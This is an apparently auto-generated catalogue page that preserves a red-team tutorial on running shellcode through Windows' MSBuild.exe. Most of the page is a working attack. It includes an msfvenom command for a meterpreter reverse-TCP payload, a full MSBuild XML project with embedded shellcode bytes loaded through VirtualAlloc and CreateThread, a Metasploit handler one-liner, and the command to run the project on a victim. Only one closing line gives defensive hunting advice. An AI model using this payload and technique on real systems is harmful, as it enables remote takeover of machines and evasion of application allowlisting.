---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Using MSBuild to Execute Shellcode in C\#

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-using-msbuild-to-execute-shellcode-in-c` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Using MSBuild to Execute Shellcode in C\#](../../topics/offensive-security/using-msbuild-to-execute-shellcode-in-c.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-execution-using-msbuild-to-execute-shellcode-in-c |
| name | Using MSBuild to Execute Shellcode in C\# |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Peek 2019-04-04 20-57.gif
- Screenshot from 2019-04-04 20-53-21.png
- Screenshot from 2019-04-04 20-54-14.png
_body: "# Using MSBuild to Execute Shellcode in C\\#\n\nIt's possible to use a native windows binary MSBuild.exe to compile\
  \ and execute inline C# code stored in an xml as discovered by [Casey Smith](https://twitter.com/subTee).\n\n## Execution\n\
  \nGenerate meterpreter shellode in c#:\n\n{% code title=\"attacker@kali\" %}\n```csharp\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=10.0.0.5 LPORT=443 -f csharp\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-53-21.png>)\n\
  \nInsert shellcode into the shellcode variable in linne 46:\n\n{% code title=\"bad.xml\" %}\n```markup\n<Project ToolsVersion=\"\
  4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n         <!-- This inline task executes shellcode.\
  \ -->\n         <!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj -->\n         <!--\
  \ Save This File And Execute The Above Command -->\n         <!-- Author: Casey Smith, Twitter: @subTee -->\n         <!--\
  \ License: BSD 3-Clause -->\n\t  <Target Name=\"Hello\">\n\t    <ClassExample />\n\t  </Target>\n\t  <UsingTask\n\t    TaskName=\"\
  ClassExample\"\n\t    TaskFactory=\"CodeTaskFactory\"\n\t    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\\
  Microsoft.Build.Tasks.v4.0.dll\" >\n\t    <Task>\n\t    \n\t      <Code Type=\"Class\" Language=\"cs\">\n\t      <![CDATA[\n\
  \t\tusing System;\n\t\tusing System.Runtime.InteropServices;\n\t\tusing Microsoft.Build.Framework;\n\t\tusing Microsoft.Build.Utilities;\n\
  \t\tpublic class ClassExample :  Task, ITask\n\t\t{         \n\t\t  private static UInt32 MEM_COMMIT = 0x1000;         \
  \ \n\t\t  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          \n\t\t  [DllImport(\"kernel32\")]\n\t\t    private\
  \ static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\n\t\t    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\
  \          \n\t\t  [DllImport(\"kernel32\")]\n\t\t    private static extern IntPtr CreateThread(            \n\t\t    UInt32\
  \ lpThreadAttributes,\n\t\t    UInt32 dwStackSize,\n\t\t    UInt32 lpStartAddress,\n\t\t    IntPtr param,\n\t\t    UInt32\
  \ dwCreationFlags,\n\t\t    ref UInt32 lpThreadId           \n\t\t    );\n\t\t  [DllImport(\"kernel32\")]\n\t\t    private\
  \ static extern UInt32 WaitForSingleObject(           \n\t\t    IntPtr hHandle,\n\t\t    UInt32 dwMilliseconds\n\t\t   \
  \ );          \n\t\t  public override bool Execute()\n\t\t  {\n\t\t\t//replace with your own shellcode\n\t\t    byte[] shellcode\
  \ = new byte[] { 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x00,0x00,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5\
  \ };\n\t\t      \n\t\t      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,\n\t\t\tMEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\
  \t\t      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\n\t\t      IntPtr hThread = IntPtr.Zero;\n\t\
  \t      UInt32 threadId = 0;\n\t\t      IntPtr pinfo = IntPtr.Zero;\n\t\t      hThread = CreateThread(0, 0, funcAddr, pinfo,\
  \ 0, ref threadId);\n\t\t      WaitForSingleObject(hThread, 0xFFFFFFFF);\n\t\t      return true;\n\t\t  } \n\t\t}     \n\
  \t      ]]>\n\t      </Code>\n\t    </Task>\n\t  </UsingTask>\n\t</Project>\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-04 20-54-14.png>)\n\nSpin up a handler in metasploit to catch your shell:\n\n{% code title=\"attacker@kali\"\
  \ %}\n```csharp\nmsfconsole -x \"use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp;\
  \ exploit\"\n```\n{% endcode %}\n\nBuild and execute malicious payload on the victim system using MSBuild:\n\n{% code title=\"\
  attacker@victim\" %}\n```csharp\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\bad\\bad.xml\n```\n\
  {% endcode %}\n\n![](<../../.gitbook/assets/Peek 2019-04-04 20-57.gif>)\n\n## Observation\n\nNote that it's MSBuild.exe\
  \ that will make the TCP connection to the attacker, so as a defender, you should think about hunting for TCP connections\
  \ initiated by MSBuild.\n\n## References\n\n[https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17](https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17)"
_relative_path: offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c.md
````
